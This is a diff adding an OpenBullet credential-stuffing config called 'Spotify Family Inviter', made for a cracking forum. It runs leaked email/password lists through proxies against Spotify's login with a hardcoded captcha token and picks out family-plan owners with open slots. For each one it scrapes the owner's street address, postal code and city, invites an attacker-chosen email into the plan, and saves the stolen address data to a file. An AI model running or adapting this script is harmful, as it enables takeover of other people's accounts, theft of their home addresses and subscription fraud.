@@ -1,0 +1,158 @@
+[SETTINGS]
+{
+  "Name": "Spotify Family Inviter",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-22T02:35:00.3788091+02:00",
+  "AdditionalInfo": "Made for Cracked.to by Micro",
+  "Author": "Micro",
+  "Version": "1.2.6.5 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "What country ?",
+      "VariableName": "countryoption",
+      "Id": 1157976263
+    },
+    {
+      "Description": "First Name",
+      "VariableName": "firstname",
+      "Id": 1981706022
+    },
+    {
+      "Description": "Last Name",
+      "VariableName": "lastname",
+      "Id": 1568128070
+    },
+    {
+      "Description": "Email to invite",
+      "VariableName": "tempemail",
+      "Id": 1563816993
+    }
+  ],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_CSRF_TOKEN REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1" 
+  HEADER "Pragma: no-cache" 
+
+PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+#LOG_IN REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&recaptchaToken=03AOLTBLRgYyQljHTff4GyEXkvHtC_06Q7yrlSSkzD_Gb1FvbIB-bPxP9xDaShV_sPZYk7p2CXXU0p2bUNi1TfSHYHn9IQBm-W9uIfr11h6w32oUhp7VV_z5vJE-owj729HIEnubOs3rffyBxgHs0dtl1o1mYTRF0L9OR7OyX8F9OlKxlERiAMuGxFGcibChkgntYljZjNK6l118YN9BN5S9R3zXK64oPXMksXVklvZXNqdKppIwYJYOifjkPCZ_gtHFr3D6N8X4d1E4mEhYAtCWQ0YBepecRWo3YNWhXbnbwEcR32BaYq_sxdLzfh-mrsHB0TGbOTm3_Q&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "'userCountry': 'us'" 
+    KEY "{\"displayName\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "errorInvalidCredentials" 
+    KEY "Unexpected status: 400" 
+    KEY "{\"error\":\"errorUnknown\"}" 
+
+#LOG_IN_2 REQUEST POST "https://www.spotify.com/us/account/overview/" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Spotify Free" 
+    KEY "Premium Paused" 
+
+#GET_SUB_INFO REQUEST GET "https://www.spotify.com/us/family/overview/" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "'owner': \"Owner\"," 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "'owner': \"Owner\"," 
+
+#PARSE_xcsrf PARSE "<SOURCE>" LR "CSRF_TOKEN: \"" "\"" -> VAR "xcsrf" 
+
+PARSE "<SOURCE>" LR "'userCountry': '" "'" -> VAR "Country1" 
+
+PARSE "<SOURCE>" LR "familyPlanData: \"\\" "};" -> VAR "Members" 
+
+FUNCTION CountOccurrences "pUuid" "<Members>" -> VAR "AmountOfMembers" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<AmountOfMembers>" EqualTo "5" 
+  KEYCHAIN Success OR 
+    KEY "<AmountOfMembers>" LessThan "5" 
+
+#GET_ADDRESS_DETAILS REQUEST GET "https://www.spotify.com/us/family/api/get-family-plan/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "isMaster\":true,\"needsAddressCollected\":false,\"address\":{\"postalCode\":\"" "\"" -> CAP "Postal Code" 
+
+PARSE "<SOURCE>" LR "city\":\"" "\"" -> CAP "City" 
+
+PARSE "<SOURCE>" LR "\",\"line1\":\"" "\"" -> CAP "Street" 
+
+#INVITE_PEOPLE REQUEST POST "https://www.spotify.com/us/family/api/master-invite-by-email/" 
+  CONTENT "{\"firstName\":\"<firstname>\",\"lastName\":\"<lastname>\",\"email\":\"<tempemail>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-csrf-token: <xcsrf>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\",\"success\":true}" 
+  KEYCHAIN Failure OR 
+    KEY "Invite limit reached" 
+
+FUNCTION ClearCookies 
+
+REQUEST GET "http://restcountries.eu/rest/v2/alpha?codes=<Country1>" AutoRedirect=FALSE 
+  
+  HEADER "Host: restcountries.eu" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (compatible; Rigor/1.0.0; http://rigor.com)" 
+
+PARSE "<SOURCE>" LR "[{\"name\":\"" "\"" -> CAP "Country2" "<Country1>/" "" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<Country1>" Contains "<countryoption>" 
+  KEYCHAIN Failure OR 
+    KEY "<Country1>" DoesNotContain "<countryoption>" 
+
+UTILITY File "Spotify Invites.txt" Write "Email: <tempemail>\\r\\nFirst Name: <firstname>\\r\\nLast Name: <lastname>\\r\\nPostal Code: <Postal Code>\\r\\nCity: <City>\\r\\nStreet: <Street>\\r\\nCountry: <Country1>" -> VAR "OUTPUT" 
+
